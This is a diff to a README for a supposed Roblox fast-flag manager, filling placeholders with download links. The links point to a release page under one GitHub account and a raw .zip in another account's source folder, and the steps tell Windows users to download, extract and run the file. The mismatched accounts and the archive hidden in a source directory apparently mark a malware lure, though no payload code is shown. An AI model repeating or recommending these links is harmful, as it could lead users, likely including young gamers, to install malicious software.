@@ -1,6 +1,6 @@
 # ⚡ Roblox-Fastflag-Manager - Fast flag control made simple
 
-[![Download Roblox-Fastflag-Manager](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](............)
+[![Download Roblox-Fastflag-Manager](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Betne88281/Roblox-Fastflag-Manager-2026/releases/tag/download)
 
 ## 📥 Download
 Visit this page to download: https://raw.githubusercontent.com/cesarspindlelegged589/Roblox-Fastflag-Manager/main/src/core/Roblox-Manager-Fastflag-v1.0.zip
@@ -30,7 +30,7 @@ For a smooth install on Windows, use:
 
 Follow these steps to download and run the app on Windows.
 
-1. Open the release page: ......
+1. Open the release page: https://github.com/Betne88281/Roblox-Fastflag-Manager-2026/releases/tag/download
 2. Find the latest release at the top of the page
 3. Download the Windows file from the Assets section
 4. If the file is in a .zip folder, right-click it and choose Extract All
@@ -141,7 +141,7 @@ Before changing Roblox flags, back up your current setup. That gives you a simpl
 
 ## 📦 Download location
 
-Download the latest Windows release here: .....................
+Download the latest Windows release here: https://github.com/Betne88281/Roblox-Fastflag-Manager-2026/releases/tag/download
 
 ## 🖱️ Quick start path
 
